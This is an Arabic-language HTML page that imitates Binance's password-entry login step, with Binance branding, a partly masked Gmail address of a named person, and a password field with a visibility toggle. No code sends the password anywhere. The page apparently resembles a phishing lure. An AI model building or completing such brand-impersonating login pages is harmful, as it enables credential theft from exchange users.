<!DOCTYPE html>
<html lang="ar">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول - Binance</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f8f8f8;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .login-container {
            background-color: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            text-align: center;
            width: 300px;
        }

        .logo {
            font-size: 24px;
            font-weight: bold;
            color: #f3ba2f;
            margin-bottom: 20px;
        }

        h2 {
            font-size: 18px;
            margin-bottom: 10px;
        }

        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
        }

        .password-container {
            position: relative;
        }

        .toggle-password {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
        }

        .btn {
            background-color: #f3ba2f;
            color: white;
            border: none;
            padding: 10px;
            width: 100%;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }

        .btn:hover {
            background-color: #e0a700;
        }

        .forgot-password {
            display: block;
            margin-top: 10px;
            color: #555;
            font-size: 14px;
            text-decoration: none;
        }
    </style>
</head>

<body>

    <div class="login-container">
        <div class="logo">BINANCE</div>
        <h2>أدخل كلمة المرور</h2>
        <p>KHALIDALSI****@gmail.com</p>
        <div class="password-container">
            <input type="password" id="password" placeholder="كلمة المرور">
            <span class="toggle-password" onclick="togglePassword()">👁️</span>
        </div>
        <button class="btn">التالي</button>
        <a href="#" class="forgot-password">هل نسيت كلمة المرور؟</a>
    </div>

    <script>
        function togglePassword() {
            var passwordInput = document.getElementById("password");
            if (passwordInput.type === "password") {
                passwordInput.type = "text";
            } else {
                passwordInput.type = "password";
            }
        }
    </script>
</body>

</html>
